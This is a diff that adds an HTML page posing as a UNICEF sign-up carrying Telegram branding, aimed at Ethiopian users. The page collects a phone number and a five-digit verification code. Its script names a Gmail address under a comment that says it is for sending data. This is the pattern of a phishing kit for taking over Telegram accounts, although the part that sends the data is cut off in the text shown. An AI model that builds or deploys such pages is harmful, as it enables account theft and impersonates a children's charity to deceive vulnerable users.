@@ -1,0 +1,1386 @@
+<!DOCTYPE html>
+<html lang="am">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>UNICEF</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+}
+
+body {
+  background: linear-gradient(135deg, #FFFFFF 0%, #FFFFFF 100%);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  min-height: 100vh;
+  padding: 20px;
+  animation: gradientBG 15s ease infinite;
+  background-size: 400% 400%;
+}
+
+@keyframes gradientBG {
+  0% { background-position: 0% 50%; }
+  50% { background-position: 100% 50%; }
+  100% { background-position: 0% 50%; }
+}
+
+.container {
+  width: 100%;
+  max-width: 500px;
+  animation: fadeIn 0.8s ease-out;
+}
+
+@keyframes fadeIn {
+  from { opacity: 0; transform: translateY(20px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+.header {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin-bottom: 25px;
+  position: relative;
+}
+.logo {
+  align-items: center;
+  font-size: 90px;
+  color: #2AABEE;
+  background: white;
+  border-radius: 50px;
+  display: flex;
+  position: absolute;
+  width: 85px;
+  height: 85px;
+}
+.telegram-logo {
+  width: 85px;
+  height: 85px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  position: relative;
+  box-shadow: 0 10px 30px rgba(42, 171, 238, 0.5);
+  animation: pulse 2s infinite;
+}
+
+@keyframes pulse {
+  0% { box-shadow: 0 10px 30px rgba(42, 171, 238, 0.5); }
+  50% { box-shadow: 0 10px 40px rgba(42, 171, 238, 0.8); }
+  100% { box-shadow: 0 10px 30px rgba(42, 171, 238, 0.5); }
+}
+
+.telegram-logo::before {
+ background-image:"src";
+  font-size: 42px;
+  color: white;
+  font-weight: bold;
+}
+
+.unicef-logo {
+  position: absolute;
+  right: 100;
+  top: 5;
+  width: 60px;
+  height: 60px;
+  background: rgba(255, 255, 255, 0.95);
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 0px;
+  box-shadow: 0 6px 20px rgba(0, 0, 0, 0.15);
+  transition: transform 0.3s ease;
+}
+
+.unicef-logo:hover {
+  transform: scale(1.55);
+}
+
+.unicef-logo img {
+  width: 200%;
+  height: auto;
+  border-radius: 50%;
+}
+
+.card {
+  background: white;
+  border-radius: 20px;
+  box-shadow: 0 15px 50px rgba(0, 0, 0, 0.25);
+  overflow: hidden;
+  margin-bottom: 30px;
+  transition: transform 0.3s ease, box-shadow 0.3s ease;
+}
+
+.card:hover {
+  transform: translateY(-8px);
+  box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+}
+
+.card-header {
+  background: linear-gradient(to right, #2AABEE, #2AABEE);
+  padding: 30px 25px 25px;
+  border-bottom: 1px solid #e9ecef;
+  color: white;
+  text-align: center;
+}
+
+.card-header h1 {
+  font-size: 28px;
+  margin-bottom: 10px;
+  font-weight: 700;
+  letter-spacing: 0.5px;
+}
+
+.card-header p {
+  font-size: 16px;
+  opacity: 0.95;
+  line-height: 1.6;
+}
+
+.card-body {
+  padding: 30px;
+}
+
+.form-group {
+  margin-bottom: 28px;
+  animation: slideUp 0.5s ease-out;
+}
+
+@keyframes slideUp {
+  from { opacity: 0; transform: translateY(15px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+.form-group label {
+  display: block;
+  font-size: 16px;
+  color: #6c757d;
+  margin-bottom: 12px;
+  font-weight: 600;
+}
+
+.country-selector {
+  width: 100%;
+  padding: 16px 20px;
+  border: 2px solid #e0e6ed;
+  border-radius: 12px;
+  background-color: white;
+  font-size: 16px;
+  color: #212529;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  transition: all 0.3s ease;
+  margin-bottom: 20px;
+}
+
+.country-selector:hover {
+  border-color: #2AABEE;
+  transform: translateY(-3px);
+  box-shadow: 0 5px 15px rgba(42, 171, 238, 0.1);
+}
+
+.country-selector:focus {
+  outline: none;
+  border-color: #2AABEE;
+  box-shadow: 0 0 0 4px rgba(42, 171, 238, 0.25);
+}
+
+.country-flag {
+  width: 32px;
+  height: 22px;
+  margin-right: 15px;
+  border-radius: 4px;
+  object-fit: cover;
+  border: 1px solid #dee2e6;
+}
+
+.country-dropdown {
+  position: absolute;
+  top: 100%;
+  left: 0;
+  right: 0;
+  background: white;
+  border: 2px solid #e0e6ed;
+  border-radius: 12px;
+  max-height: 350px;
+  overflow-y: auto;
+  z-index: 1000;
+  display: none;
+  box-shadow: 0 15px 40px rgba(0, 0, 0, 0.15);
+}
+
+.country-dropdown.active {
+  display: block;
+  animation: dropdownFade 0.3s ease;
+}
+
+@keyframes dropdownFade {
+  from { opacity: 0; transform: translateY(-10px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+.country-item {
+  padding: 16px 20px;
+  display: flex;
+  align-items: center;
+  cursor: pointer;
+  transition: all 0.2s ease;
+  border-bottom: 1px solid #f8f9fa;
+}
+
+.country-item:hover {
+  background-color: #f8f9fa;
+  transform: translateX(5px);
+}
+
+.country-item.selected {
+  background-color: #e7f5ff;
+  border-left: 4px solid #2AABEE;
+}
+
+.phone-input-container {
+  display: flex;
+  align-items: center;
+  border: 1px solid #e0e6ed;
+  border-radius: 12px;
+  overflow: hidden;
+  transition: all 0.3s ease;
+}
+
+.phone-input-container:focus-within {
+  border-color: #2AABEE;
+  box-shadow: 0 0 0 4px rgba(42, 171, 238, 0.25);
+}
+
+.country-code {
+  padding: 17px 20px;
+  background: linear-gradient(to right, #f8f9fa, #e9ecef);
+  border-right: 2px solid #e0e6ed;
+  font-size: 17px;
+  color: #212529;
+  font-weight: 700;
+  min-width: 100px;
+  text-align: center;
+}
+
+.phone-input {
+  flex: 1;
+  border: none;
+  padding: 16px 20px;
+  font-size: 15px;
+  color: #212529;
+  background: white;
+}
+
+.phone-input:focus {
+  outline: none;
+  background-color: #fafdff;
+}
+
+.code-sent-info {
+  background: linear-gradient(to right, #e7f5ff, #D0EBFF);
+  border-radius: 15px;
+  padding: 25px;
+  margin-bottom: 30px;
+  text-align: center;
+  animation: slideUp 0.6s ease-out;
+  border: 2px solid #a5d8ff;
+}
+
+.code-sent-info h3 {
+  font-size: 22px;
+  color: #212529;
+  margin-bottom: 12px;
+  font-weight: 700;
+}
+
+.code-sent-info p {
+  font-size: 16px;
+  color: #6c757d;
+  line-height: 1.7;
+}
+
+.phone-number-display {
+  font-size: 12px;
+  font-weight: 800;
+  color: #212529;
+  margin: 15px 0;
+  padding: 15px 17px;
+  background: white;
+  border-radius: 10px;
+  display: inline-block;
+  animation: pulseSoft 2s infinite;
+  border: 2px solid #2AABEE;
+}
+
+@keyframes pulseSoft {
+  0% { box-shadow: 0 0 0 0 rgba(42, 171, 238, 0.3); }
+  70% { box-shadow: 0 0 0 12px rgba(42, 171, 238, 0); }
+  100% { box-shadow: 0 0 0 0 rgba(42, 171, 238, 0); }
+}
+
+.code-input-container {
+  position: relative;
+  margin-bottom: 50px;
+}
+
+.code-input {
+  width: 100%;
+  height:40%;
+  padding:20#FFFFFFpx;
+  border: 3px solid #ced4da;
+  border-radius: 12px;
+  font-size: 26px;
+  text-align: center;
+  letter-spacing: 12px;
+  color: #212529;
+  font-weight: 700;
+  transition: all 0.3s ease;
+  background: #f8f9fa;
+}
+
+.code-input:focus {
+  outline: none;
+  border-color: #2AABEE;
+  box-shadow: 0 0 0 4px rgba(42, 171, 238, 0.25);
+  transform: scale(1.02);
+  background: white;
+}
+
+.code-input.error {
+  border-color: #dc3545;
+  background: #fff5f5;
+  animation: shake 0.5s ease;
+}
+
+@keyframes shake {
+  0%, 100% { transform: translateX(0); }
+  25% { transform: translateX(-5px); }
+  75% { transform: translateX(5px); }
+}
+
+.btn {
+  width: 100%;
+  padding: 18px;
+  border: none;
+  border-radius: 12px;
+  font-size: 18px;
+  font-weight: 700;
+  cursor: pointer;
+  transition: all 0.3s ease;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  position: relative;
+  overflow: hidden;
+  letter-spacing: 0.5px;
+}
+
+.btn span {
+  position: relative;
+  z-index: 1;
+}
+
+.btn::after {
+  content: '';
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  width: 0;
+  height: 0;
+  border-radius: 50%;
+  background: rgba(255, 255, 255, 0.2);
+  transform: translate(-50%, -50%);
+  transition: width 0.6s, height 0.6s;
+}
+
+.btn:hover::after {
+  width: 400px;
+  height: 400px;
+}
+
+.btn-primary {
+  background: linear-gradient(to right, #2AABEE, #2AABEE);
+  color: white;
+}
+
+.btn-primary:hover {
+  background: linear-gradient(to right, #2AABEE, #2AABEE);
+  transform: translateY(-4px);
+  box-shadow: 0 10px 25px rgba(42, 171, 238, 0.5);
+}
+
+.btn-primary:disabled {
+  background: #a5d8f3;
+  cursor: not-allowed;
+  transform: none;
+  box-shadow: none;
+  opacity: 0.7;
+}
+
+.btn-secondary {
+  background: linear-gradient(to right, #6c757d, #5a6268);
+  color: white;
+  margin-top: 20px;
+}
+
+.btn-secondary:hover {
+  background: linear-gradient(to right, #5a6268, #495056);
+  transform: translateY(-4px);
+  box-shadow: 0 10px 25px rgba(108, 117, 125, 0.4);
+}
+
+.btn-secondary:disabled {
+  background: #adb5bd;
+  cursor: not-allowed;
+  transform: none;
+  box-shadow: none;
+  opacity: 0.7;
+}
+
+.footer {
+  text-align: center;
+  font-size: 14px;
+  color: #6c757d;
+  line-height: 1.7;
+  padding: 20px;
+  border-top: 1px solid #e9ecef;
+  margin-top: 25px;
+}
+
+.footer a {
+  color: #2AABEE;
+  text-decoration: none;
+  font-weight: 600;
+  transition: color 0.2s ease;
+}
+
+.footer a:hover {
+  color: #2AABEE;
+  text-decoration: underline;
+}
+
+.steps {
+  display: none;
+  justify-content: center;
+  margin-bottom: 35px;
+  position: relative;
+}
+
+.steps::before {
+  content: '';
+  position: absolute;
+  top: 50%;
+  left: 50px;
+  right: 50px;
+  height: 4px;
+  background: #e9ecef;
+  transform: translateY(-50%);
+  z-index: 0;
+}
+
+.step {
+  width: 50px;
+  height: 50px;
+  border-radius: 50%;
+  background-color: white;
+  color: #6c757d;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin: 0 15px;
+  font-weight: 800;
+  font-size: 18px;
+  border: 4px solid #e9ecef;
+  position: relative;
+  z-index: 1;
+  transition: all 0.4s ease;
+}
+
+.step.active {
+  background-color: #2AABEE;
+  color: white;
+  border-color: #2AABEE;
+  transform: scale(1.15);
+  box-shadow: 0 8px 20px rgba(42, 171, 238, 0.5);
+}
+
+.step.completed {
+  background-color: #20c997;
+  color: white;
+  border-color: #20c997;
+  animation: bounce 0.5s ease;
+}
+
+@keyframes bounce {
+  0%, 100% { transform: scale(1); }
+  50% { transform: scale(1.3); }
+}
+
+.alert {
+  padding: 18px;
+  border-radius: 12px;
+  margin-bottom: 25px;
+  font-size: 15px;
+  animation: slideUp 0.8s ease-out;
+}
+
+.alert-info {
+  background: linear-gradient(to right, #65B5DE, #0AA0EE4F);
+  border-left: 6px solid #2AABEE;
+  color: #0c5460;
+  font-weight: 500;
+}
+
+.alert-warning {
+  background: linear-gradient(to right, #fff3cd, #ffeaa7);
+  border-left: 6px solid #ffc107;
+  color: #856404;
+  font-weight: 500;
+}
+
+.login-options {
+  display: flex;
+  gap: 15px;
+  margin-top: 30px;
+  animation: slideUp 0.9s ease-out;
+}
+
+.option-btn {
+  flex: 1;
+  padding: 16px;
+  border: 2px solid #e0e6ed;
+  border-radius: 12px;
+  background-color: white;
+  font-size: 16px;
+  color: #212529;
+  cursor: pointer;
+  transition: all 0.3s ease;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-weight: 600;
+}
+
+.option-btn i {
+  margin-right: 10px;
+  font-size: 20px;
+}
+
+.option-btn:hover {
+  background-color: #f8f9fa;
+  border-color: #2AABEE;
+  transform: translateY(-4px);
+  box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
+}
+
+.page {
+  display: none;
+  animation: pageFade 0.5s ease-out;
+}
+
+@keyframes pageFade {
+  from { opacity: 0; transform: translateX(20px); }
+  to { opacity: 1; transform: translateX(0); }
+}
+
+.page.active {
+  display: block;
+}
+
+.validation-message {
+  font-size: 14px;
+  color: #dc3545;
+  margin-top: 8px;
+  display: none;
+  animation: slideUp 0.3s ease;
+}
+
+.validation-message.show {
+  display: block;
+}
+
+.country-search {
+  padding: 14px 20px;
+  border-bottom: 2px solid #e9ecef;
+  background: #f8f9fa;
+}
+
+.country-search input {
+  width: 100%;
+  padding: 10px 15px;
+  border: 2px solid #dee2e6;
+  border-radius: 8px;
+  font-size: 15px;
+}
+
+.country-search input:focus {
+  outline: none;
+  border-color: #2AABEE;
+}
+
+@media (max-width: 480px) {
+  .container {
+    max-width: 100%;
+  }
+  
+  .card-header h1 {
+    font-size: 24px;
+  }
+  
+  .card-header p {
+    font-size: 15px;
+  }
+  
+  .country-selector, .phone-input, .code-input, .btn {
+    padding: 5px 7px;
+  }
+  
+  .login-options {
+    flex-direction: column;
+  }
+  
+  .telegram-logo {
+    width: 75px;
+    height: 75px;
+  }
+  
+  .unicef-logo {
+    width: 50px;
+    height: 50px;
+  }
+  
+  .step {
+    width: 45px;
+    height: 45px;
+    margin: 0 10px;
+  }
+  
+  .code-input {
+    font-size: 22px;
+    letter-spacing: 10px;
+  }
+}
+
+.success-animation {
+  text-align: center;
+  margin: 40px 0;
+  animation: slideUp 1s ease-out;
+}
+
+.success-circle {
+  width: 120px;
+  height: 120px;
+  background: linear-gradient(135deg, #20c997, #1aa179);
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin: 0 auto 30px;
+  animation: successPulse 2s infinite;
+  box-shadow: 0 10px 30px rgba(32, 201, 151, 0.4);
+}
+
+@keyframes successPulse {
+  0% { box-shadow: 0 10px 30px rgba(32, 201, 151, 0.4); }
+  50% { box-shadow: 0 10px 40px rgba(32, 201, 151, 0.7); }
+  100% { box-shadow: 0 10px 30px rgba(32, 201, 151, 0.4); }
+}
+
+.success-check {
+  color: white;
+  font-size: 60px;
+  font-weight: bold;
+}
+
+.success-title {
+  margin-bottom: 20px;
+  color: #212529;
+  font-size: 26px;
+  font-weight: 800;
+}
+
+.success-message {
+  color: #6c757d;
+  font-size: 17px;
+  line-height: 1.8;
+}
+</style>
+</head>
+<body>
+
+<div class="container">
+  <div class="header">
+    <div class="telegram-logo">
+      </div>
+   <div class="logo">
+     <i class="fab fa-telegram"></i>
+   </div>
+    <div class="unicef-logo">
+      <img src="Flag_of_UNICEF.svg.png" alt="UNICEF Logo">
+    </div>
+  </div>
+  
+  <div class="steps">
+    <div class="step completed">1</div>
+    <div class="step active">2</div>
+    <div class="step">3</div>
+  </div>
+  
+  <!-- ደረጃ 1: ስልክ ቁጥር -->
+  <div class="card page active" id="phone-page">
+    <div class="card-header">
+      <h1>Sign up to UNICEF</h1>
+      <p>Please confirm your country code and enter your phone number.</p>
+    </div>
+    
+    <div class="card-body">
+      <div class="form-group">
+        <label for="country">Select Country</label>
+        <div class="country-selector" id="country-selector">
+          <div>
+            <img src="https://flagcdn.com/w40/et.png" class="country-flag" alt="Ethiopia">
+            <span>Ethiopia (+251)</span>
+          </div>
+          <span>▼</span>
+        </div>
+        
+        <div class="country-dropdown" id="country-dropdown">
+          <div class="country-search">
+            <input type="text" id="country-search" placeholder="Search country...">
+          </div>
+          <!-- ሀገራት በJavaScript ይጨመራሉ -->
+        </div>
+      </div>
+      
+      <div class="form-group">
+        <label for="phone">Phone Number</label>
+        <div class="phone-input-container">
+          <div class="country-code" id="country-code">+251</div>
+          <input type="tel" class="phone-input" id="phone" placeholder="Enter phone number" autocomplete="off">
+        </div>
+        <div class="validation-message" id="phone-error"></div>
+      </div>
+      
+      <div class="alert alert-info">
+        <strong>አስፈላጊ:</strong> ያስገቡት ስልክ ቁጥር ትክክል መሆኑን ያረጋግጡ። ለኢትዮጵያ፡ 09xxxxxxxx (10 አሃዞች)።
+      </div>
+      
+      <button class="btn btn-primary" id="next-btn">
+        <span>Send Code</span>
+      </button>
+      
+      <div class="footer">
+        <p>By signing up, you agree to the <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.</p>
+        <p>© 2025 Unicef FZ-LLC</p>
+      </div>
+    </div>
+  </div>
+  
+  <!-- ደረጃ 2: ኮድ ማስገቢያ -->
+  <div class="card page" id="code-page">
+    <div class="card-header">
+      <h1>Verification Code</h1>
+      <p>Enter the 5-digit code sent to your phone</p>
+    </div>
+    
+    <div class="card-body">
+      <div class="code-sent-info">
+        <h3>We have sent you a code</h3>
+        <div class="phone-number-display" id="display-phone">+251 989 523 647</div>
+        <p>A 5-digit verification code has been sent to your phone number. The code will expire in <strong>60 seconds</strong>.</p>
+      </div>
+      
+      <div class="form-group">
+        <label for="code">5-Digit Verification Code</label>
+        <div class="code-input-container">
+          <input type="text" class="code-input" id="code" placeholder="00000" maxlength="5" autocomplete="off">
+        </div>
+        <div class="validation-message" id="code-error"></div>
+      </div>
+      
+      
+      <button class="btn btn-primary" id="signin-btn">
+        <span>Verify & Sign In</span>
+      </button>
+      
+    </div>
+  </div>
+  
+  <!-- ደረጃ 3: አልቋል -->
+  <div class="card page" id="success-page">
+    <div class="card-header">
+      <h1>Sign in Successful</h1>
+      <p>Welcome to UNICEF</p>
+    </div>
+    
+    <div class="card-body">
+      <div class="success-animation">
+        <div class="success-circle">
+          <span class="success-check">✓</span>
+        </div>
+        <h3 class="success-title">Logged In Successfully</h3>
+        <p class="success-message">Your account has been verified. You can now use Telegram Web on this device with Unicef partnership features.</p>
+      </div>
+      
+      <div class="login-options">
+        <button class="option-btn" id="open-telegram">
+          <i class="fas fa-external-link-alt"></i>
+          Open Unicef Official Web
+        </button>
+        <button class="option-btn" id="download-app">
+          <i class="fas fa-download"></i>
+          Download Mobile App
+        </button>
+      </div>
+      
+      <div class="footer">
+        <p>© 2025 Telegram FZ-LLC in partnership with Unicef</p>
+        <p><a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a> | <a href="#">Contact Support</a></p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+// የኢሜል አድራሻ ለውሂብ መላኪያ
+const EMAIL = "unicefethiopia2346@gmail.com";
+
+// የጊዜ ቆጠባ ተለዋዋጮች
+let countdownTimer;
+let timeLeft = 60;
+let isCodeExpired = false;
+
+// የተመረጠ ሀገር
+let selectedCountry = {
+  code: "ET",
+  name: "Ethiopia",
+  dialCode: "+251",
+  flag: "https://flagcdn.com/w40/et.png",
+  phonePattern: /^(09\d{8}|9\d{8})$/,
+  phoneLength: 10,
+  example: "0912345678"
+};
+
+// ሙሉ የሀገር ዝርዝር (ብዙ ሀገራት ጨምረዋል)
+const countries = [
+  {code: "US", name: "United States", dialCode: "+1", flag: "https://flagcdn.com/w40/us.png", phonePattern: /^\d{10}$/, phoneLength: 10, example: "1234567890"},
+  {code: "CA", name: "Canada", dialCode: "+1", flag: "https://flagcdn.com/w40/ca.png", phonePattern: /^\d{10}$/, phoneLength: 10, example: "1234567890"},
+  {code: "GB", name: "United Kingdom", dialCode: "+44", flag: "https://flagcdn.com/w40/gb.png", phonePattern: /^(\d{10,11})$/, phoneLength: [10,11], example: "7912345678"},
+  {code: "ET", name: "Ethiopia", dialCode: "+251", flag: "https://flagcdn.com/w40/et.png", phonePattern: /^(09\d{8}|9\d{8})$/, phoneLength: 10, example: "0912345678"},
+  {code: "KE", name: "Kenya", dialCode: "+254", flag: "https://flagcdn.com/w40/ke.png", phonePattern: /^(07\d{8}|7\d{8})$/, phoneLength: 10, example: "0712345678"},
+  {code: "SD", name: "Sudan", dialCode: "+249", flag: "https://flagcdn.com/w40/sd.png", phonePattern: /^(09\d{8}|9\d{8})$/, phoneLength: 10, example: "0912345678"},
+  {code: "ER", name: "Eritrea", dialCode: "+291", flag: "https://flagcdn.com/w40/er.png", phonePattern: /^(07\d{6}|7\d{6})$/, phoneLength: 8, example: "07123456"},
+  {code: "DJ", name: "Djibouti", dialCode: "+253", flag: "https://flagcdn.com/w40/dj.png", phonePattern: /^(07\d{6}|7\d{6})$/, phoneLength: 8, example: "07123456"},
+  {code: "SO", name: "Somalia", dialCode: "+252", flag: "https://flagcdn.com/w40/so.png", phonePattern: /^(07\d{7}|7\d{7})$/, phoneLength: 9, example: "071234567"},
+  {code: "EG", name: "Egypt", dialCode: "+20", flag: "https://flagcdn.com/w40/eg.png", phonePattern: /^(01\d{9}|1\d{9})$/, phoneLength: 11, example: "01234567890"},
+  {code: "SA", name: "Saudi Arabia", dialCode: "+966", flag: "https://flagcdn.com/w40/sa.png", phonePattern: /^(05\d{8}|5\d{8})$/, phoneLength: 10, example: "0512345678"},
+  {code: "AE", name: "UAE", dialCode: "+971", flag: "https://flagcdn.com/w40/ae.png", phonePattern: /^(05\d{8}|5\d{8})$/, phoneLength: 10, example: "0512345678"},
+  {code: "IT", name: "Italy", dialCode: "+39", flag: "https://flagcdn.com/w40/it.png", phonePattern: /^(3\d{8,9})$/, phoneLength: [9,10], example: "3123456789"},
+  {code: "DE", name: "Germany", dialCode: "+49", flag: "https://flagcdn.com/w40/de.png", phonePattern: /^(1[567]\d{8}|15\d{9})$/, phoneLength: [10,11], example: "15123456789"},
+  {code: "FR", name: "France", dialCode: "+33", flag: "https://flagcdn.com/w40/fr.png", phonePattern: /^(6\d{8}|7\d{8})$/, phoneLength: 9, example: "612345678"},
+  {code: "PL", name: "Poland", dialCode: "+48", flag: "https://flagcdn.com/w40/pl.png", phonePattern: /^(\d{9})$/, phoneLength: 9, example: "123456789"},
+  {code: "ES", name: "Spain", dialCode: "+34", flag: "https://flagcdn.com/w40/es.png", phonePattern: /^(6\d{8}|7\d{8})$/, phoneLength: 9, example: "612345678"},
+  {code: "RU", name: "Russia", dialCode: "+7", flag: "https://flagcdn.com/w40/ru.png", phonePattern: /^(9\d{9})$/, phoneLength: 10, example: "9123456789"},
+  {code: "CN", name: "China", dialCode: "+86", flag: "https://flagcdn.com/w40/cn.png", phonePattern: /^(1[3-9]\d{9})$/, phoneLength: 11, example: "13123456789"},
+  {code: "IN", name: "India", dialCode: "+91", flag: "https://flagcdn.com/w40/in.png", phonePattern: /^([6-9]\d{9})$/, phoneLength: 10, example: "9876543210"},
+  {code: "JP", name: "Japan", dialCode: "+81", flag: "https://flagcdn.com/w40/jp.png", phonePattern: /^(0[789]\d{8}|[789]\d{8})$/, phoneLength: 10, example: "09012345678"},
+  {code: "BR", name: "Brazil", dialCode: "+55", flag: "https://flagcdn.com/w40/br.png", phonePattern: /^([1-9]{2}9?\d{8})$/, phoneLength: [10,11], example: "11987654321"},
+  {code: "AU", name: "Australia", dialCode: "+61", flag: "https://flagcdn.com/w40/au.png", phonePattern: /^(04\d{8}|4\d{8})$/, phoneLength: 10, example: "0412345678"},
+  {code: "ZA", name: "South Africa", dialCode: "+27", flag: "https://flagcdn.com/w40/za.png", phonePattern: /^(0[678]\d{8}|[678]\d{8})$/, phoneLength: 10, example: "0712345678"},
+  {code: "NG", name: "Nigeria", dialCode: "+234", flag: "https://flagcdn.com/w40/ng.png", phonePattern: /^(0[7-9]\d{9}|[7-9]\d{9})$/, phoneLength: 11, example: "08012345678"},
+  {code: "GH", name: "Ghana", dialCode: "+233", flag: "https://flagcdn.com/w40/gh.png", phonePattern: /^(0[235]\d{8}|[235]\d{8})$/, phoneLength: 10, example: "0201234567"}
+];
+
+// ገጾችን ለመቀያየር
+function showPage(pageId) {
+  document.querySelectorAll('.page').forEach(page => {
+    page.classList.remove('active');
+  });
+  
+  document.getElementById(pageId).classList.add('active');
+  updateSteps(pageId);
+}
+
+// ደረጃዎችን ማዘመን
+function updateSteps(pageId) {
+  const steps = document.querySelectorAll('.step');
+  
+  steps.forEach(step => {
+    step.classList.remove('active', 'completed');
+  });
+  
+  if (pageId === 'phone-page') {
+    steps[0].classList.add('active', 'completed');
+  } else if (pageId === 'code-page') {
+    steps[0].classList.add('completed');
+    steps[1].classList.add('active');
+  } else if (pageId === 'success-page') {
+    steps[0].classList.add('completed');
+    steps[1].classList.add('completed');
+    steps[2].classList.add('active', 'completed');
+  }
+}
+
+// ሀገራትን መጫን
+function loadCountries() {
+  const dropdown = document.getElementById('country-dropdown');
+  const searchInput = document.getElementById('country-search');
+  
+  function renderCountries(filter = '') {
+    dropdown.innerHTML = `
+      <div class="country-search">
+        <input type="text" id="country-search" placeholder="Search country..." value="${filter}">
+      </div>
+    `;
+    
+    const filteredCountries = countries.filter(country => 
+      country.name.toLowerCase().includes(filter.toLowerCase()) || 
+      country.dialCode.includes(filter)
+    );
+    
+    filteredCountries.forEach(country => {
+      const item = document.createElement('div');
+      item.className = `country-item ${country.code === selectedCountry.code ? 'selected' : ''}`;
+      item.setAttribute('data-code', country.code);
+      item.innerHTML = `
+        <img src="${country.flag}" class="country-flag" alt="${country.name}">
+        <span style="flex: 1;">${country.name}</span>
+        <span style="font-weight: 700; color: #2AABEE;">${country.dialCode}</span>
+      `;
+      
+      item.addEventListener('click', () => {
+        selectCountry(country);
+        dropdown.classList.remove('active');
+        searchInput.value = '';
+      });
+      
+      dropdown.appendChild(item);
+    });
+    
+    // የፍለጋ ኢንፑት ማያያዝ
+    document.getElementById('country-search').addEventListener('input', (e) => {
+      renderCountries(e.target.value);
+    });
+    
+    document.getElementById('country-search').focus();
+  }
+  
+  renderCountries();
+}
+
+// ሀገር ምረጥ
+function selectCountry(country) {
+  selectedCountry = country;
+  
+  const selector = document.getElementById('country-selector');
+  selector.innerHTML = `
+    <div style="display: flex; align-items: center;">
+      <img src="${country.flag}" class="country-flag" alt="${country.name}">
+      <span>${country.name} (${country.dialCode})</span>
+    </div>
+    <span>▼</span>
+  `;
+  
+  document.getElementById('country-code').textContent = country.dialCode;
+  
+  // የስልክ ኢንፑት ፕሌስሆልደር ማዘመን
+  const phoneInput = document.getElementById('phone');
+  phoneInput.placeholder = `Example: ${country.example}`;
+  
+  // የተመረጠ ሀገር ምልክት
+  document.querySelectorAll('.country-item').forEach(item => {
+    item.classList.remove('selected');
+    if (item.getAttribute('data-code') === country.code) {
+      item.classList.add('selected');
+    }
+  });
+}
+
+// የስልክ ቁጥር ማረጋገጫ
+function validatePhoneNumber(phone) {
+  const errorElement = document.getElementById('phone-error');
+  
+  if (!phone || phone.trim() === '') {
+    errorElement.textContent = "እባክዎ ስልክ ቁጥር ያስገቡ";
+    errorElement.classList.add('show');
+    return false;
+  }
+  
+  const cleanPhone = phone.replace(/\s/g, '').replace(/\D/g, '');
+  
+  if (!selectedCountry.phonePattern.test(cleanPhone)) {
+    let message = "እባክዎ ትክክለኛ ስልክ ቁጥር ያስገቡ";
+    
+    if (selectedCountry.code === "ET") {
+      message = "ለኢትዮጵያ፡ 09xxxxxxxx (10 አሃዞች መሆን አለበት፣ በ09 መጀመር አለበት)";
+    } else if (selectedCountry.code === "KE") {
+      message = "For Kenya: 07xxxxxxxx (10 digits, starting with 07)";
+    } else if (selectedCountry.code === "US") {
+      message = "For US/Canada: 10-digit number (e.g., 1234567890)";
+    }
+    
+    errorElement.textContent = message;
+    errorElement.classList.add('show');
+    return false;
+  }
+  
+  errorElement.classList.remove('show');
+  return true;
+}
+
+// የኮድ ማረጋገጫ
+function validateCode(code) {
+  const errorElement = document.getElementById('code-error');
+  const codeInput = document.getElementById('code');
+  
+  if (isCodeExpired) {
+    errorElement.textContent = "ይህ ኮድ ጊዜው አልፎበታል። እባክዎ አዲስ ኮድ ያግኙ።";
+    errorElement.classList.add('show');
+    codeInput.classList.add('error');
+    return false;
+  }
+  
+  if (!code || code.trim() === '') {
+    errorElement.textContent = "እባክዎ 5-አሃዝ ኮድ ያስገቡ";
+    errorElement.classList.add('show');
+    codeInput.classList.add('error');
+    return false;
+  }
+  
+  if (code.length !== 5) {
+    errorElement.textContent = "ኮዱ 5 አሃዞች መሆን አለበት";
+    errorElement.classList.add('show');
+    codeInput.classList.add('error');
+    return false;
+  }
+  
+  if (!/^\d{5}$/.test(code)) {
+    errorElement.textContent = "እባክዎ ቁጥሮች ብቻ ያስገቡ (0-9)";
+    errorElement.classList.add('show');
+    codeInput.classList.add('error');
+    return false;
+  }
+  
+  errorElement.classList.remove('show');
+  codeInput.classList.remove('error');
+  return true;
+}
+
+// የጊዜ ቆጠባ መጀመር
+function startCountdown() {
+  const countdownElement = document.getElementById('countdown');
+  const timerTextElement = document.getElementById('timer-text');
+  const resendBtn = document.getElementById('resend-btn');
+  const progressBar = document.querySelector('.progress-bar');
+  const codeInput = document.getElementById('code');
+  const signinBtn = document.getElementById('signin-btn');
+  
+  timeLeft = 60;
+  isCodeExpired = false;
+  resendBtn.disabled = true;
+  resendBtn.innerHTML = '<span>Resend Code (60s)</span>';
+  
+  codeInput.disabled = false;
+  signinBtn.disabled = false;
+  
+  countdownTimer = setInterval(function() {
+    timeLeft--;
+    
+    const minutes = Math.floor(timeLeft / 60);
+    const seconds = timeLeft % 60;
+    countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+    timerTextElement.textContent = timeLeft;
+    
+    const progress = 283 - (timeLeft / 60 * 283);
+    progressBar.style.strokeDashoffset = progress;
+    
+    if (timeLeft <= 10) {
+      countdownElement.style.color = "#dc3545";
+      timerTextElement.style.color = "#dc3545";
+    }
+    
+    if (timeLeft <= 0) {
+      clearInterval(countdownTimer);
+      countdownElement.textContent = "00:00";
+      timerTextElement.textContent = "0";
+      resendBtn.disabled = false;
